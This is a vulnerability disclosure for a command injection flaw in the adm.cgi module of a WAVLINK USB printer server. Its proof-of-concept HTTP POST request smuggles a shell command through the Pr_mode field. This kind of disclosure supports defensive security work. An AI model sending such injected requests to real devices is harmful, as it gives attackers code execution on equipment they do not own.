## WAVLINK WL-NU516U1-A USB Printer Server

Firmware Version: M16U1_V240425

Vulnerability Type: Command Injection

### Overview

A command injection vulnerability has been discovered in the WAVLINK WL-NU516U1-A USB Printer Server. The vulnerability lies in the `adm.cgi` module. When the `page` parameter is set to `usb_p910`, command execution can be achieved by constructing parameters such as `Pr_mode` .

### Vulnerability Details

![](../main/images/2026-02-14-16-47-26-image.png)

![](../main/images/2026-02-14-16-47-03-1ea5446e-bc0f-4b61-b4de-8797aa660a30.png)

### poc

```http
POST /cgi-bin/adm.cgi HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.9

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 55

Origin: http://192.168.0.1

Connection: close

Referer: http://192.168.0.1/html/user_login.shtml

Cookie: language=sc; session=1227460431

Upgrade-Insecure-Requests: 1

Priority: u=0, i



page=usb_p910&start_m=0&Pr_mode=1";echo 1 >/tmp/1.txt;#
```

![](../main/images/2026-02-14-16-48-44-a23c222e-5041-41e9-88ab-c93fa5957f8f.png)

